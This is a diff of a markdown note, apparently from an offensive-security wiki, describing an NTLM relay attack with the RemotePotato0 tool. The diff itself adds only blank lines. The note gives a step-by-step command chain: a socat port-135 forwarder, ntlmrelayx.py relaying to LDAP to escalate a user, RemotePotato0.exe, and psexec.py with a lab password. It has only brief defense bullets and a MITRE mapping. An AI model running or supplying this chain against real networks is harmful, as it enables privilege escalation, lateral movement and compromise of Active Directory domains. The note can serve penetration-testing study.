@@ -41,11 +41,15 @@ DCOM DCE RPC Relay using RemotePotato0 takes advantage of the DCOM DCE RPC servi
 Business Value:
 DCOM DCE RPC Relay using RemotePotato0 can be used to gain access to a target system and execute arbitrary code on it. This can lead to the compromise of sensitive data, intellectual property, and other valuable assets. It can also be used to move laterally within a network and gain access to other systems, increasing the scope of the attack.
 
+ 
+
 ## Requirements
 
 1. Access to a network with vulnerable DCOM DCE RPC service
 
 1. RemotePotato0 tool
+
+ 
 
 ## Defense
 
@@ -55,6 +59,8 @@ DCOM DCE RPC Relay using RemotePotato0 can be used to gain access to a target sy
 
 1. Use strong authentication mechanisms such as multi-factor authentication
 
+ 
+
 ## Objectives
 
 1. Gain access to a target system
@@ -63,17 +69,27 @@ DCOM DCE RPC Relay using RemotePotato0 can be used to gain access to a target sy
 
 1. Move laterally within a network
 
+ 
+
 # Instructions
 
 1. Follow the below instructions to execute RemotePotato0 command:
 
+ 
+
+
+
 **Code**: [[# https://github.com/antonioCoco/RemotePotato0/
 Te]]
+
+
 
 > 1. First, open the terminal and execute the following command: 'sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 & # Can be omitted for Windows Server <= 2016'
 2. Next, execute the command 'sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1'
 3. Then, execute the command 'Session0> RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2'
 4. Finally, execute the command 'psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'' to complete the process.
+
+
 
 **Command** ([[Setup TCP listener]]):
 
@@ -81,11 +97,19 @@ Te]]
 sudo socat TCP-LISTEN:135,fork,reuseaddr TCP:192.168.83.131:9998 &
 ```
 
+
+
+
+
 **Command** ([[NTLM relay attack]]):
 
 ```bash
 sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winrm_user_1
 ```
+
+
+
+
 
 **Command** ([[Execute RemotePotato0]]):
 
@@ -93,11 +117,17 @@ sudo ntlmrelayx.py -t ldap://192.168.83.135 --no-wcf-server --escalate-user winr
 RemotePotato0.exe -r 192.168.83.130 -p 9998 -s 2
 ```
 
+
+
+
+
 **Command** ([[Execute psexec.py]]):
 
 ```bash
 psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -123,3 +153,5 @@ psexec.py 'LAB/winrm_user_1:Password123!@192.168.83.135'
 - [[Active Directory Attacks]]
 - [[Man-in-the-Middle attacks & relaying]]
 - [[RemotePotato0 DCOM DCE RPC relay]]
+
+
